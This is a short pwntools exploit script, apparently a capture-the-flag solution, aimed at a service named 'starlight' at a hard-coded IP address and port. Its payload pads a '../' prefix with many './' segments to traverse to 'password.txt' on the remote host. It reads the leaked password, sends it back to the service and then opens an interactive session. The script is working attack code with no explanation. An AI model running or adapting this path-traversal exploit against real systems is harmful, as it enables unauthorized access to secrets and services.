#!/usr/bin/env python
from pwn import *

context.terminal = ['tmux', 'split-window', '-h']
context.log_level = ['debug', 'info', 'warn'][1]

BINARY = './starlight'
HOST = '203.34.119.237'
PORT = 11337

def exploit(REMOTE):
    payload = '../'
    payload += './' * (51)
    payload += 'password.txt'
    r.sendlineafter(': ', payload)
    password = str(r.recv(33))
    r.send("3\n%s\n" % password)

if __name__ == '__main__':
    #REMOTE = True
    #elf = ELF(BINARY, checksec=False)
    r = remote(HOST, PORT)
    #info(r.pid)

    exploit(r)
    r.interactive()


